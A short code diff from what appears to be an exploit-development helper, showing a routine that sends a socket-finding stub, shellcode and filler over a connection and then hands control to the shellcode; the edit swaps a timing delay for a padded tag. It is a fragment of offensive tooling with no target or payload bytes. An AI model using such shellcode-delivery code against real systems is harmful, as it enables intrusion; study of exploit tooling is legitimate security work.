@@ -16,8 +16,7 @@ def findtag(tag):
     sock.do_exploit()
     sock.send(findtag(TAG) + foo_shellcode('ebp') + GARBAGE)
     time.sleep(0.5) # Here so that the findtag will have time to remove the garbarge
-    sock.send(TAG)
-    time.sleep(0.1) # Only here so that findtag does not eat the output intended for foo_shellcode
+    sock.send(TAG.ljust(127))
     sock.talk_with_foo_shellcode()
 
     On my test system, it could clean out about 4k of garbage per second.
